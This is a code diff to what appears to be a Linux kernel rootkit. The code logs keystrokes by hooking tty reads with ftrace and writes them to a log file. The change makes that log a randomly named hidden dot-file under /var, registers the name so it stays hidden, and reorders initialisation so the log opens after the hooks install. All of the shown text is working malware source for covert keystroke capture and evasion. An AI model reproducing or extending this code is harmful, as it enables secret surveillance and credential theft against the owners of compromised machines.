@@ -781,8 +781,9 @@ void _keylog_cleanup(void) {
     _keylog_cleanup_list();
     _keylog_close_file();
 
-    if (_rm_tty_log && fs_file_rm(TTYFILE))
-        prerr("Error removing %s\n", TTYFILE);
+    char *tty = sys_ttyfile();
+    if (tty && _rm_tty_log && fs_file_rm(tty))
+        prerr("Error removing %s\n", tty);
 }
 
 static ssize_t  (*real_tty_read)(struct file *, char __user *, size_t, loff_t *);
@@ -1072,23 +1073,40 @@ void fh_remove_hooks(struct ftrace_hook *hooks) {
     }
 }
 
-bool sys_init(void) {
-    struct kstat stat;
-    int idx = 0, rc;
+char *sys_ttyfile(void) {
+    static char tty[16];
+    if (*tty == 0) {
+        char tmp[8] = {0};
 
-    /** init hooks - negate so we're consistent with other inits */
-    rc = !fh_install_hooks(ft_hooks);
-    if (rc) {
-        for (idx = 0; ft_hooks[idx].name != NULL; ++idx)
-            prinfo("ftrace hook %d on %s\n", idx, ft_hooks[idx].name);
-    } else {
-        return false;
+        *tmp = '.';
+        snprintf(&tmp[1], 7, "%s", kv_whatever_random_AZ_string(7));
+        snprintf(tty, 15, "/var/%s", tmp);
+        fs_add_name_ro(tmp);
+        prinfo("new tty filename: '%s'\n", tty);
     }
 
-    /** Init tty log */
-    ttyfilp = fs_kernel_open_file(TTYFILE);
-    if (!ttyfilp) {
-        return false;
+    return tty;
+}
+
+bool sys_init(void) {
+    struct kstat stat;
+    int idx = 0, rc = false;
+    char *ttyfile = sys_ttyfile();
+
+    if (ttyfile) {
+        /** init hooks - negate so we're consistent with other inits */
+        rc = !fh_install_hooks(ft_hooks);
+        if (rc) {
+            for (idx = 0; ft_hooks[idx].name != NULL; ++idx)
+                prinfo("ftrace hook %d on %s\n", idx, ft_hooks[idx].name);
+
+            /** Init tty log */
+            ttyfilp = fs_kernel_open_file(ttyfile);
+            if (!ttyfilp) {
+                prerr("Failed loading tty file\n");
+                rc = false;
+            }
+        }
     }
     return rc;
 }
